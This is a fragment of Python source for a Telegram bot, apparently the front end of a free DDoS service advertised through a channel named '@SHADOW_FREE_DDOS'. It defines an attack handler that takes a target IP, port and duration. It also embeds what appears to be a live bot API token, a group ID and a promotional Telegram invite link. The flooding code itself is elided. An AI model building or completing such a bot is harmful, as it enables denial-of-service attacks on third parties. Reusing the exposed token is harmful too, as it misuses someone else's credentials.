...
bot = telebot.TeleBot('7662081041:AAF7dPj1NcbL4OLY8dSCBPSft14JAbFSvAs')
...
GROUP_ID = "-1002229402494"
CHANNEL_USERNAME = "@SHADOW_FREE_DDOS"
...
def handle_attack(message):
    ...
    if len(command) != 4:
        bot.reply_to(message, "⚠️ **𝐔𝐒𝐀𝐆𝐄:** /Ultra `<IP>` `<PORT>` `<TIME>`")
        return
...
👉 [𝙏𝙚𝙡𝙚𝙜𝙧𝙖𝙢 𝙂𝙧𝙤𝙪𝙥](https://t.me/+WcEGeYTeO_EyMjhl) 🚀🔥"""
